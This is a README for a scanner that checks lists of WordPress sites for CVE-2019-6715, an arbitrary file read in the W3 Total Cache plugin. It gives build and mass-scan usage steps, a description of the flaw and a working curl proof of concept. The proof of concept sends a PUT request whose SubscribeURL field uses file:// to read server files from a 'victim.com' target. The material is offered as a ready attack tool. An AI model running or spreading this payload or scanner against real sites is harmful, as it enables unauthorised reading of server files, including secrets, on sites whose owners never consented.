# cve-2019-6715

### Shout out to TomNomNom for 99.9% of his code....

### Build

```
go get github.com/fatih/color
go build
```

### Usage

```
cat list.txt | ./2019-6715
```

All vuln urls are logged in text.log


CVE 2019-6715
---

Description: pub/sns.php in the W3 Total Cache plugin before 0.9.4 for WordPress allows remote attackers to read arbitrary files via the SubscribeURL field in SubscriptionConfirmation JSON data.

Vulnerability Type: arbitrary file read

Vendor of Product: Wordpress W3 Total Cache plugin by Frederick Townes

Affected Product Code Base: W3 Total Cache - 0.9.2.6 - 0.9.3, fixed in 0.9.4

Affected Component: Affected source code file: w3-total-cache/pub/sns.php

Exploit - PoC:
---


```
curl -X PUT --data '{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"file://file_path"}' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36' http://victim.com/wp-content/plugins/w3-total-cache/pub/sns.php
```
